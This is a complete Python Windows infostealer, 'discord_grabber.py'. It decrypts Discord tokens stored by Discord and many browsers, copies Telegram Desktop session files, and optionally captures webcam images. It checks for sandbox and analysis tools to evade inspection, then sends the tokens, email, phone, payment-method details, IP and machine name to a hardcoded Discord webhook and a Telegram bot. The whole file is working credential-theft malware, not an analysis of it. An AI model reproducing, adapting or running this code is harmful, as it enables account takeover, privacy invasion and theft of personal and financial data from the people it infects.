# discord_grabber.py (modified: Discord token via webhook, sessions via Telegram bot)
import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import time
import shutil
import zipfile

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            Logger.info(f"Installing module {pip_name}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            Logger.info(f"Restarting script to import {module}")
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome"), ("psutil", "psutil"), ("requests", "requests"), ("cv2", "opencv-python")])

import win32crypt
from Crypto.Cipher import AES
import psutil
import requests
import cv2

# Debug: Verify re module is loaded
try:
    Logger.info(f"re module version: {re.__version__}")
except AttributeError:
    Logger.info("Error: re module not available")
    sys.exit(1)

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + '\\Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

class Settings:
    CaptureGames = True
    CaptureTelegram = True
    CaptureWebcam = False  # Disabled to avoid camera errors

class Utility:
    @staticmethod
    def GetLnkFromStartMenu(name):
        start_menu = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs")
        results = []
        for root, _, files in os.walk(start_menu):
            for file in files:
                if file.lower().startswith(name.lower()) and file.endswith(".lnk"):
                    results.append(os.path.join(root, file))
        Logger.info(f"Found {len(results)} Telegram shortcuts in Start Menu")
        return results

    @staticmethod
    def GetLnkTarget(lnk_path):
        try:
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(lnk_path)
            return shortcut.Targetpath
        except Exception as e:
            Logger.info(f"Error getting shortcut target for {lnk_path}: {str(e)}")
            return None

class Logger:
    @staticmethod
    def info(message):
        print(f"[INFO] {message}")

class Grabber:
    def __init__(self):
        self.TempFolder = os.path.join(os.getenv("TEMP"), "Grabber")
        self.TelegramSessionsCount = 0
        self.WebcamImagesCount = 0
        os.makedirs(self.TempFolder, exist_ok=True)
        self.tg_bot_token = "8480405909:AAFxBOzo1kVPpde1lBx-lqOmRBJ2d7is7s4"
        self.tg_chat_id = "7234535860"

    def getheaders(self, token=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def gettokens(self, path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []
        if not os.path.exists(path):
            Logger.info(f"Path does not exist: {path}")
            return tokens
        for file in os.listdir(path):
            if not file.endswith(".ldb") and not file.endswith(".log"):
                continue
            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                Logger.info(f"Permission denied for file: {path}{file}")
                continue
        Logger.info(f"Found {len(tokens)} tokens in {path}")
        return tokens
    
    def getkey(self, path):
        try:
            with open(path + f"\\Local State", "r") as file:
                key = json.loads(file.read())['os_crypt']['encrypted_key']
                file.close()
            return key
        except Exception as e:
            Logger.info(f"Error getting key from {path}\\Local State: {str(e)}")
            return None

    def getip(self):
        try:
            with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
                return json.loads(response.read().decode()).get("ip")
        except Exception as e:
            Logger.info(f"Error getting IP: {str(e)}")
            return "None"

    def is_sandbox(self):
        sandbox_processes = [
            "vboxservice.exe",
            "vboxtray.exe",
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "vmwareuser.exe",
            "vgauthservice.exe",
            "vgtray.exe",
            "wireshark.exe",
            "procmon.exe",
            "tcpview.exe"
        ]
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in [p.lower() for p in sandbox_processes]:
                Logger.info(f"Sandbox process detected: {proc.info['name']}")
                return True
        return False

    def StealTelegramSessions(self) -> None:
        if Settings.CaptureTelegram:
            Logger.info("Stealing Telegram sessions")
            telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Telegram")] if x is not None])]
            Logger.info(f"Found Telegram paths from shortcuts: {telegramPaths}")
            
            # Add default and custom Telegram paths
            default_path = os.path.join(os.getenv("APPDATA"), "Telegram Desktop")
            custom_paths = [
                default_path,
                # Add custom paths here if Telegram is installed elsewhere
                # Example: r"C:\Program Files\Telegram\Telegram Desktop"
            ]
            if not telegramPaths:
                telegramPaths = custom_paths
                Logger.info(f"No Telegram shortcuts found, using paths: {telegramPaths}")

            multiple = len(telegramPaths) > 1
            saveToDir = os.path.join(self.TempFolder, "Messenger", "Telegram")
            
            for index, telegramPath in enumerate(telegramPaths):
                tDataPath = os.path.join(telegramPath, "tdata")
                Logger.info(f"Checking tdata path: {tDataPath}")
                loginPaths = []
                files = []
                dirs = []
                has_key_datas = False

                if not os.path.isdir(tDataPath):
                    Logger.info(f"tdata path does not exist: {tDataPath}")
                    continue

                for item in os.listdir(tDataPath):
                    itempath = os.path.join(tDataPath, item)
                    if item == "key_datas":
                        has_key_datas = True
                        loginPaths.append(itempath)
                    if os.path.isfile(itempath):
                        files.append(item)
                    else:
                        dirs.append(item)
                
                Logger.info(f"Found {len(files)} files and {len(dirs)} directories in {tDataPath}")
                
                for filename in files:
                    for dirname in dirs:
                        if dirname + "s" == filename:
                            loginPaths.extend([os.path.join(tDataPath, x) for x in (filename, dirname)])
            
                if has_key_datas and len(loginPaths) - 1 > 0:
                    _saveToDir = saveToDir
                    if multiple:
                        _saveToDir = os.path.join(_saveToDir, "Profile %d" % (index + 1))
                    os.makedirs(_saveToDir, exist_ok=True)

                    failed = False
                    for loginPath in loginPaths:
                        try:
                            if os.path.isfile(loginPath):
                                shutil.copy(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)))
                            else:
                                shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)), dirs_exist_ok=True)
                            Logger.info(f"Copied {loginPath} to {_saveToDir}")
                        except Exception as e:
                            Logger.info(f"Error copying {loginPath}: {str(e)}")
                            shutil.rmtree(_saveToDir, ignore_errors=True)
                            failed = True
                            break
                    if not failed:
                        self.TelegramSessionsCount += int((len(loginPaths) - 1)/2)
                        Logger.info(f"Successfully captured {self.TelegramSessionsCount} Telegram sessions")
            
            if self.TelegramSessionsCount and multiple:
                with open(os.path.join(saveToDir, "Info.txt"), "w") as file:
                    file.write("Multiple Telegram installations are found, so the files for each of them are put in different Profiles")
                Logger.info("Created Info.txt for multiple Telegram installations")

    def capture_images(self, num_images=1):
        Logger.info("Starting webcam capture")
        cameras = []
        temp_path = self.TempFolder
        webcam_dir = os.path.join(temp_path, "Webcam")
        os.makedirs(webcam_dir, exist_ok=True)

        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            Logger.info("No camera found at index 0")
            return
        cameras.append(cap)
        Logger.info("Found 1 camera")

        for _ in range(num_images):
            for i, cap in enumerate(cameras):
                ret, frame = cap.read()
                if ret:
                    image_path = os.path.join(webcam_dir, f"image_from_camera_{i}.jpg")
                    cv2.imwrite(image_path, frame)
                    self.WebcamImagesCount += 1
                    Logger.info(f"Captured image: {image_path}")
                else:
                    Logger.info(f"Failed to capture image from camera {i}")

        for cap in cameras:
            cap.release()

    def main(self):
        webhook_url = "https://discord.com/api/webhooks/1408074946823061584/5-TtHlkjiJXt0ggykFuoiJ_g87B319KIvEw_PLYTTFn1C6MLdOgJ0kVeWYF-X2Oshpr8"
        Logger.info("Starting main execution")

        if self.is_sandbox():
            Logger.info("Sandbox detected, sleeping for 40 seconds")
            time.sleep(40)

        self.StealTelegramSessions()
        if Settings.CaptureWebcam:
            self.capture_images()

        files_to_send = []
        
        if self.TelegramSessionsCount > 0:
            Logger.info(f"Creating Telegram.zip with {self.TelegramSessionsCount} sessions")
            telegram_dir = os.path.join(self.TempFolder, "Messenger", "Telegram")
            telegram_zip_path = os.path.join(self.TempFolder, "Telegram.zip")
            try:
                with zipfile.ZipFile(telegram_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, _, files in os.walk(telegram_dir):
                        for file in files:
                            zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(self.TempFolder, "Messenger")))
                Logger.info(f"Telegram.zip created at {telegram_zip_path}")
                files_to_send.append(telegram_zip_path)
            except Exception as e:
                Logger.info(f"Error creating Telegram.zip: {str(e)}")

        if self.WebcamImagesCount > 0:
            Logger.info(f"Creating Webcam.zip with {self.WebcamImagesCount} images")
            webcam_dir = os.path.join(self.TempFolder, "Webcam")
            webcam_zip_path = os.path.join(self.TempFolder, "Webcam.zip")
            try:
                with zipfile.ZipFile(webcam_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, _, files in os.walk(webcam_dir):
                        for file in files:
                            zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), webcam_dir))
                Logger.info(f"Webcam.zip created at {webcam_zip_path}")
                files_to_send.append(webcam_zip_path)
            except Exception as e:
                Logger.info(f"Error creating Webcam.zip: {str(e)}")

        description = f"Stolen Sessions\nTelegram Sessions: {self.TelegramSessionsCount}\nWebcam Images: {self.WebcamImagesCount}"
        try:
            response = requests.post(f"https://api.telegram.org/bot{self.tg_bot_token}/sendMessage", data={"chat_id": self.tg_chat_id, "text": description})
            if response.status_code == 200:
                Logger.info("Description sent to Telegram")
            else:
                Logger.info(f"Failed to send description to Telegram: {response.text}")
        except Exception as e:
            Logger.info(f"Error sending description to Telegram: {str(e)}")

        for file_path in files_to_send:
            try:
                with open(file_path, 'rb') as f:
                    response = requests.post(f"https://api.telegram.org/bot{self.tg_bot_token}/sendDocument", data={"chat_id": self.tg_chat_id}, files={"document": f})
                    if response.status_code == 200:
                        Logger.info(f"{os.path.basename(file_path)} sent to Telegram")
                    else:
                        Logger.info(f"Failed to send {os.path.basename(file_path)} to Telegram: {response.text}")
            except Exception as e:
                Logger.info(f"Error sending {os.path.basename(file_path)} to Telegram: {str(e)}")

        checked = []
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                Logger.info(f"Path does not exist: {path}")
                continue

            for token in self.gettokens(path):
                token = token.replace("\\", "") if token.endswith("\\") else token
                try:
                    token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(self.getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                    if token in checked:
                        continue
                    checked.append(token)

                    res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=self.getheaders(token)))
                    if res.getcode() != 200:
                        Logger.info(f"Invalid token for {platform}: {token[:20]}...")
                        continue
                    res_json = json.loads(res.read().decode())

                    badges = ""
                    flags = res_json['flags']
                    if flags == 64 or flags == 96:
                        badges += ":BadgeBravery: "
                    if flags == 128 or flags == 160:
                        badges += ":BadgeBrilliance: "
                    if flags == 256 or flags == 288:
                        badges += ":BadgeBalance: "

                    params = urllib.parse.urlencode({"with_counts": True})
                    res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=self.getheaders(token))).read().decode())
                    guilds = len(res)
                    guild_infos = ""

                    for guild in res:
                        if guild['permissions'] & 8 or guild['permissions'] & 32:
                            res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=self.getheaders(token))).read().decode())
                            vanity = ""
                            if res["vanity_url_code"] is not None:
                                vanity = f"""; .gg/{res["vanity_url_code"]}"""
                            guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                    if guild_infos == "":
                        guild_infos = "No guilds"

                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token))).read().decode())
                    has_nitro = bool(len(res) > 0)
                    exp_date = None
                    if has_nitro:
                        badges += f":BadgeSubscriber: "
                        exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=self.getheaders(token))).read().decode())
                    available = 0
                    print_boost = ""
                    boost = False
                    for id in res:
                        cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                        if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                            print_boost += f"ㅤ- Available now\n"
                            available += 1
                        else:
                            print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                        boost = True
                    if boost:
                        badges += f":BadgeBoost: "

                    payment_methods = 0
                    type = ""
                    valid = 0
                    for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=self.getheaders(token))).read().decode()):
                        if x['type'] == 1:
                            type += "CreditCard "
                            if not x['invalid']:
                                valid += 1
                            payment_methods += 1
                        elif x['type'] == 2:
                            type += "PayPal "
                            if not x['invalid']:
                                valid += 1
                            payment_methods += 1

                    print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                    nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                    print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                    embed_user = {
                        'embeds': [
                            {
                                'title': f"**New user data: {res_json['username']}**",
                                'description': f"""
                                    ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {self.getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                                'color': 3092790,
                                'footer': {
                                    'text': "Made by Dope"
                                },
                                'thumbnail': {
                                    'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                                }
                            }
                        ],
                        "username": "Grabber",
                        "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                    }

                    try:
                        urllib.request.urlopen(urllib.request.Request(webhook_url, data=json.dumps(embed_user).encode('utf-8'), headers=self.getheaders(), method='POST')).read().decode()
                        Logger.info(f"Successfully sent Discord data for {res_json['username']} to webhook")
                    except Exception as e:
                        Logger.info(f"Error sending Discord data to webhook: {str(e)}")
                except urllib.error.HTTPError as e:
                    Logger.info(f"HTTP error for token in {platform}: {str(e)}")
                    continue
                except json.JSONDecodeError as e:
                    Logger.info(f"JSON decode error for token in {platform}: {str(e)}")
                    continue
                except Exception as e:
                    Logger.info(f"Error processing token in {platform}: {str(e)}")
                    continue

        Logger.info("Main execution completed")
        # time.sleep(20)  # Removed to prevent unnecessary delay
        # os.remove(sys.argv[0])  # Commented out for debugging

if __name__ == "__main__":
    grabber = Grabber()
    grabber.main()